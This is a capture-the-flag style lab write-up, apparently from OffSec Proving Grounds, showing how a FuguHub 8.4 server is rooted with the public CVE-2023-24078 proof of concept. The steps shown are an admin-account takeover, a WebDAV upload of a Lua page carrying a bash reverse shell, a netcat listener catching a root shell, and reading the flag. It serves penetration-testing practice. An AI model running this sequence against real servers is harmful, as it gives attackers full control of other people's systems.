`└─$ head ./192.168.190.25/nmapAutomator_192.168.190.25_all.txt -n 200` 

`Running all scans on 192.168.190.25`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`80/tcp   open  http`
`8082/tcp open  blackice-alerts`
`9999/tcp open  abyss`

If we check out http://192.168.193.25:8082, it asks us to create an administrator account.
Let's check the About page to see what we're working with.

![[Pasted image 20240214145856.png]]

If we google "FuguHub 8.4 exploitdb" - the second result is a PoC with a video.
https://github.com/overgrowncarrot1/CVE-2023-24078

Launch the PoC

`└─$ python CVE-2023-24078.py -p 4444 -l 192.168.45.235 -r 192.168.193.25 -P 8082`
`Installing necessary tools if not already installed`
`Colorama installed, not installing`
`Selenium installed, not installing`
 `_____ _____  _____    ______ _   _ _____ _   _ _   _ _   _______` 
`|  _  |  __ \/  __ \   |  ___| | | |  __ \ | | | | | | | | | ___ \`
`| | | | |  \/| /  \/   | |_  | | | | |  \/ | | | |_| | | | | |_/ /`
`| | | | | __ | |       |  _| | | | | | __| | | |  _  | | | | ___ \`
`\ \_/ / |_\ \| \__/\   | |   | |_| | |_\ \ |_| | | | | |_| | |_/ /`
 `\___/ \____/ \____/   \_|    \___/ \____/\___/\_| |_/\___/\____/` 
`Trying to set the following parameters`
`Email adm1n@localhost.local , username adm1n password P@ssw0rd!` 
`Creating admin user on http://192.168.193.25:8082/Config-Wizard/wizard/SetAdmin.lsp` 

`Logging in to WebFileServer to retrieve cadaver information` 

`Logging in at http://192.168.193.25:8082/rtl/protected/wfslinks.lsp`
`Making lua.lsp script with bash reverse shell going to 192.168.45.235 on port 4444`

`<_io.TextIOWrapper name='lua.lsp' mode='w' encoding='UTF-8'>`
`Copy the URL you see in the popup, this will be known below as <URL>`
`Run the following commands`

`cadaver` 
 `open <URL>` 
 `cd ..` 
 `adm1n` 
 `P@ssw0rd!` 
 `put lua.lsp` 
 
`Open new tab and start listener with nc -lvnp 4444 press enter to continue`

We open Cadaver and run the commands
`└─$ cadaver`                       
`dav:!> open http://192.168.193.25:8082/fs/b1b853dc1e992ab53cc2b8ed/`
dav:/fs/b1b853dc1e992ab53cc2b8ed/> `cd ..`
`Authentication required for Web File Server on server 192.168.193.25':`
`Username: adm1n`
`Password:` 
dav:/fs/> `put /home/user/Offsec/ProvingGrounds/Hub/CVE-2023-24078/lua.lsp`
`Uploading /home/user/Offsec/ProvingGrounds/Hub/CVE-2023-24078/lua.lsp to /fs/lua.lsp':`
`Progress: [=============================>] 100.0% of 349 bytes succeeded.`
dav:/fs/> 

Launch nc as the PoC says then push enter in the PoC
`└─$ nc -nlvp 4444`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`
`Ncat: Connection from 192.168.193.25:40580.`
`bash: cannot set terminal process group (468): Inappropriate ioctl for device`
`bash: no job control in this shell`
`root@debian:/var/www/html#` 

We're root! Get the flag.
`root@debian:/var/www/html# cat /root/proof.txt`
`cat /root/proof.txt`
`f65d3514a9a9793efaec2336e9ae30e6`


